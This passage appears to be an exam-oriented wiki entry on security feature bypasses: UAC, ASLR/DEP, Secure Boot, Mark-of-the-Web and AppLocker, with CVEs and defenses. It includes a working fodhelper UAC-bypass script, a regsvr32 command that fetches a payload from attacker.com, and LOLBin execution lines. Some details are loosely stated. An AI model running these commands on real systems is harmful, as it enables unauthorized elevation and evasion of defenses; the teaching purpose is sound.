---
domain: "offensive-security"
tags: [bypass, evasion, exploitation, privilege-escalation, defense-evasion, vulnerability]
---
# Security Feature Bypass

A **Security Feature Bypass (SFB)** is a class of attack in which an adversary circumvents one or more defensive controls — such as [[Address Space Layout Randomization]], [[Data Execution Prevention]], [[Secure Boot]], or [[Windows Defender SmartScreen]] — without necessarily exploiting a memory corruption vulnerability. **Bypasses do not always grant code execution on their own**; instead, they neutralize a protection layer that would otherwise prevent or detect a subsequent exploit. In the [[MITRE ATT&CK Framework]], techniques enabling security feature bypass appear primarily under the **Defense Evasion** tactic (TA0005).

---

## Overview

Security features exist in a layered defense model — the principle of [[Defense in Depth]] — where each control assumes the others may fail. A security feature bypass attacks a single layer, often reducing a high-severity exploit chain from "blocked by mitigation" to "fully weaponizable." The Windows monthly Patch Tuesday cycle consistently lists SFB CVEs, often rated Important rather than Critical, because a bypass alone rarely causes immediate harm — but paired with a privilege escalation or remote code execution bug, the combined chain becomes devastating.

Bypasses arise for several fundamental reasons. First, security features are almost always implemented with compatibility constraints; a mitigation that breaks legitimate software will be disabled or weakened. For example, [[Control Flow Guard (CFG)]] exempts certain function pointer patterns to maintain application compatibility, and researchers have repeatedly found those exemptions usable as bypass primitives. Second, the operating system's attack surface is enormous, and a feature protecting one layer (e.g., kernel code integrity) may not account for interactions with another subsystem (e.g., a driver's IOCTL interface). Third, many mitigations rely on assumptions — about memory layout, trust signals, or process integrity — that are invalidable by an attacker who can control a small amount of state.

Real-world exploit chains almost universally include a bypass component. The [[EternalBlue]] SMB exploit combined with the DoublePulsar implant used kernel-mode shellcode that effectively bypassed Driver Signature Enforcement by operating at ring 0 after an initial kernel memory corruption. Ransomware operators routinely bypass [[User Account Control (UAC)]] to silently elevate privileges before encrypting file systems. [[PrintNightmare]] (CVE-2021-34527) bypassed Point and Print driver installation restrictions by abusing a legitimate printing subsystem feature. Browser-based exploit kits chain a sandbox escape (SFB) with a privilege escalation to achieve persistent system compromise from a single malicious web page.

SFBs are also extensively used by red teams and penetration testers to realistically model advanced persistent threat activity. Tools such as [[Cobalt Strike]], [[Metasploit]], and purpose-built PoC code from security research repositories implement dozens of documented bypass techniques. Understanding SFBs is therefore essential both offensively (to chain exploits effectively) and defensively (to understand why layered controls sometimes fail and what log artifacts are produced).

---

## How It Works

The mechanism of a security feature bypass varies depending on which security feature is being circumvented. The following covers the most prevalent categories with concrete technical detail.

### 1. UAC Bypass

[[User Account Control (UAC)]] prompts the user when a process attempts to elevate to high integrity. Certain Microsoft-signed binaries are whitelisted to auto-elevate without a prompt (they carry the `autoElevate: true` attribute in their application manifest). Attackers abuse these binaries by hijacking the DLL search order or registry keys they rely on.

**Example — fodhelper.exe method:**

```powershell
# fodhelper.exe reads HKCU:\Software\Classes\ms-settings\shell\open\command
# before the HKLM path, allowing an unprivileged write to override it

New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(Default)" -Value "cmd.exe /c start cmd.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force

Start-Process "C:\Windows\System32\fodhelper.exe"
```

Because `fodhelper.exe` is auto-elevate and it reads the user-writable registry hive before the system hive, the launched `cmd.exe` inherits high integrity — bypassing the UAC prompt entirely.

### 2. ASLR / DEP Bypass via Information Disclosure

[[Address Space Layout Randomization]] randomizes base addresses of executables, stacks, and heaps. [[Data Execution Prevention]] marks memory regions non-executable. Together they prevent reliable shellcode execution — unless the attacker can leak a runtime address (breaking ASLR) and find a **ROP (Return-Oriented Programming)** chain within already-executable memory (bypassing DEP).

**Typical chain:**

```
1. Trigger info-leak vulnerability (read-what-where primitive)
   → Leak base address of ntdll.dll or kernel32.dll

2. Compute offsets to ROP gadgets within leaked module:
   gadget_pop_eax = leaked_ntdll_base + 0x0001a23c   # pop eax ; ret
   gadget_mov_mem = leaked_ntdll_base + 0x00031f10   # mov [eax], edx ; ret

3. Build ROP chain that calls VirtualAlloc(MEM_COMMIT, PAGE_EXECUTE_READWRITE)
   → Allocates RWX memory at a known address

4. Copy shellcode to RWX region, transfer control via ROP gadget
```

The info-leak is the bypass; without it, ASLR holds. [[CVE-2019-0797]] (win32k.sys) was a kernel info-leak used in exactly this pattern.

### 3. Secure Boot / UEFI Bypass

[[Secure Boot]] validates that bootloader and kernel binaries carry signatures trusted by keys stored in UEFI firmware (Platform Key, Key Exchange Key, db). A bypass typically involves:

- A **signed-but-vulnerable bootloader** (a "BootHole" scenario — CVE-2020-10713): GRUB2's config file was not signature-checked, allowing arbitrary code execution in pre-OS environment despite Secure Boot being active.
- A **stolen or leaked signing key** (BlackLotus, 2023 — CVE-2022-21894): A Windows bootloader vulnerability allowed enrollment of a malicious UEFI application, persisting across OS reinstalls.

### 4. SmartScreen / Mark-of-the-Web Bypass

Files downloaded from the internet receive an NTFS alternate data stream tag (`Zone.Identifier`, Zone=3). SmartScreen checks this mark and reputation. Bypasses include:

```powershell
# Check for MOTW:
Get-Content -Path .\payload.exe -Stream Zone.Identifier

# Bypass: deliver payload inside a container format that strips MOTW
# (ISO, VHD, 7z with certain extraction tools do not propagate ADS)
# CVE-2022-41049: .zip files did not propagate Zone.Identifier to extracted files
```

### 5. AppLocker / WDAC Bypass via LOLBins

[[AppLocker]] and [[Windows Defender Application Control (WDAC)]] block unsigned executables. Attackers use **Living-off-the-Land Binaries ([[LOLBins]])** — signed Microsoft binaries that can proxy execution:

```cmd
# MSBuild.exe executes arbitrary C# from an .proj file - not blocked by default AppLocker rules
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe malicious.csproj

# regsvr32.exe "Squiblydoo" - COM scriptlet over HTTP, bypasses AppLocker
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

---

## Key Concepts

- **Defense Evasion**: The [[MITRE ATT&CK Framework]] tactic (TA0005) encompassing techniques that bypass, disable, or subvert security controls including AV, EDR, firewalls, and OS mitigations.
- **Exploit Chain / Chaining**: The practice of combining a security feature bypass with a separate vulnerability (e.g., RCE or LPE) to achieve an objective that neither exploit accomplishes alone; most weaponized exploits in the wild are chains.
- **Auto-Elevate Binary**: A Windows executable signed by Microsoft with `autoElevate: true` in its manifest, which Windows allows to silently elevate to high integrity without a UAC prompt; these are prime targets for UAC bypass techniques.
- **Mark of the Web (MOTW)**: An NTFS Alternate Data Stream (`Zone.Identifier`) applied by browsers and email clients to downloaded files; security features like SmartScreen and Office macro blocking rely on this attribute being present and intact.
- **Return-Oriented Programming (ROP)**: A code-reuse exploitation technique that chains short sequences of existing executable code ending in `RET` instructions (gadgets) to perform arbitrary computation without injecting new code, bypassing [[Data Execution Prevention]].
- **LOLBin (Living-off-the-Land Binary)**: A legitimate, often Microsoft-signed, binary that can be abused to execute attacker-controlled code or scripts, thereby evading application whitelisting controls that trust signed binaries by default.
- **Kernel Patch Protection (KPP / PatchGuard)**: A Windows mechanism that periodically checks kernel data structures for unauthorized modification; bypassed by rootkits that hook the checker itself or operate in time windows between checks.

---

## Exam Relevance

**Security+ SY0-701** tests security feature bypass knowledge primarily under the **Threats, Attacks and Vulnerabilities** and **Security Architecture** domains. Key points to internalize:

**Common question patterns:**

- A scenario describes an attacker who *escalated privileges without exploiting a vulnerability* — the answer is often a **UAC bypass** or **token impersonation** technique.
- Questions about **defense in depth** will ask what happens when one control fails; understanding that SFBs specifically defeat single layers reinforces why layering matters.
- **Indicators of compromise** questions may describe suspicious use of signed Windows binaries (`mshta.exe`, `regsvr32.exe`, `certutil.exe`) to download or execute code — recognize this as LOLBin/SFB behavior.
- The exam distinguishes between **vulnerability exploitation** (abusing a coding flaw) and **feature misuse** (abusing legitimate functionality in unintended ways); SFBs often fall in the latter category.

**Gotchas:**

- SFBs are rated **Important**, not **Critical**, in Microsoft's CVSS scoring, but the exam may present a scenario where an Important-rated bypass is the most dangerous element of an attack chain — do not dismiss it.
- **Disabling a security feature** (e.g., turning off Windows Defender via Group Policy) is technically a bypass but is a configuration/policy failure, not a vulnerability exploitation — the exam treats these differently.
- ASLR bypass via info-leak is **not** the same as defeating ASLR through brute force (32-bit ASLR has only ~256 positions); know the difference.
- **Secure Boot** prevents pre-OS tampering; it does not protect the running OS from a compromised kernel driver — students frequently confuse the scope.

---

## Security Implications

### CVEs and Incidents

| CVE | Feature Bypassed | Mechanism |
|-----|-----------------|-----------|
| CVE-2022-21894 | Secure Boot | Signed-but-revocable bootloader used to install BlackLotus UEFI rootkit |
| CVE-2021-34527 | Driver Signature Enforcement | PrintNightmare loaded unsigned DLL via Print Spooler SYSTEM service |
| CVE-2022-41049 | Mark of the Web / SmartScreen | .zip extraction did not propagate Zone.Identifier ADS to extracted files |
| CVE-2020-10713 | Secure Boot (GRUB2 BootHole) | GRUB2 config file parsed before signature verification, arbitrary code in boot |
| CVE-2023-36025 | SmartScreen | Windows shortcut (.url) file could reference network share, skipping SmartScreen |
| CVE-2019-0841 | AppLocker / DACL | Microsoft Edge modified ACL of AppLocker-protected file during update, exploitable by standard user |

### Attack Vectors

- **Phishing payloads in container files** (ISO/VHD/ZIP) strip MOTW, enabling malicious macros to run without prompts on unpatched systems.
- **Kernel driver exploitation** via vulnerable signed drivers (BYOVD — Bring Your Own Vulnerable Driver) allows attackers to disable EDR by terminating protected processes from kernel mode; used by Lazarus Group and ransomware operators (BlackCat, AvosLocker).
- **WMI / COM object abuse** bypasses script-based controls because WMI is a management interface that security products must leave functional.

### Detection Artifacts

- **Event ID 4688** (Process Creation with command line logging enabled): Reveals suspicious invocations of auto-elevate binaries from non-standard parent processes.
- **Sysmon Event ID 13** (Registry Value Set): Captures registry-based UAC bypass writes to `HKCU:\Software\Classes\`.
- **ETW (Event Tracing for Windows)**: Kernel telemetry captures ROP gadget execution patterns detectable by [[Microsoft Defender for Endpoint]] behavioral sensors.

---

## Defensive Measures

### Operating System Hardening

```powershell
# Enable all ASLR modes via Windows Security settings or:
Set-ProcessMitigation -System -Enable BottomUp,ForceRelocateImages,HighEntropy

# Enable DEP for all processes:
bcdedit /set nx AlwaysOn

# Enable Secure Boot validation (check status):
Confirm-SecureBootUEFI

# Configure UAC to "Always notify" (highest setting):
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    -Name "ConsentPromptBehaviorAdmin" -Value 2
```

### Application Control

- Deploy **[[Windows Defender Application Control (WDAC)]]** in block mode with a policy that restricts LOLBin abuse; use the **WDAC Wizard** to create policies based on trusted publishers.
- Configure **AppLocker** rules using the **Publisher** condition rather than path, preventing renamed binary bypasses.
- Enable **Script Block Logging** and **Constrained Language Mode** for PowerShell to limit scripting-based bypasses:

```powershell
# Enforce PowerShell Constrained Language Mode via WDAC policy
# (set in WDAC policy XML - affects all non-WDAC-trusted scripts)
# Verify current mode:
$ExecutionContext.SessionState.LanguageMode
```

### Endpoint Detection and Response

- Deploy [[Microsoft Defender for Endpoint]] with **Attack Surface Reduction (ASR) rules** enabled:
  - Block abuse of exploited vulnerable signed drivers
  - Block execution of potentially obfuscated scripts
  - Block Office applications from spawning child processes
- Enable **Exploit Protection** (EMET successor) per-application mitigations via `Windows Security > App & Browser Control > Exploit Protection`.

### Secure Boot and Firmware

- Ensure UEFI **Secure Boot** is enabled and the **Secure Boot database** is updated via Windows Update (includes revoked bootloaders like the BlackLotus-enabling binary).
- Enable **[[Virtualization-Based Security (VBS)]]** and **[[Hypervisor-Protected Code Integrity (HVCI)]]** to prevent BYOVD attacks — kernel memory becomes hardware-isolated.

```powershell
# Check VBS / HVCI status:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object VirtualizationBasedSecurityStatus, CodeIntegrityPolicyEnforcementStatus
```

### Patch Management

- Prioritize patching **Important**-rated SFB CVEs; despite lower CVSS scores, they are frequently prerequisites for weaponized exploit chains.
- Subscribe to **Microsoft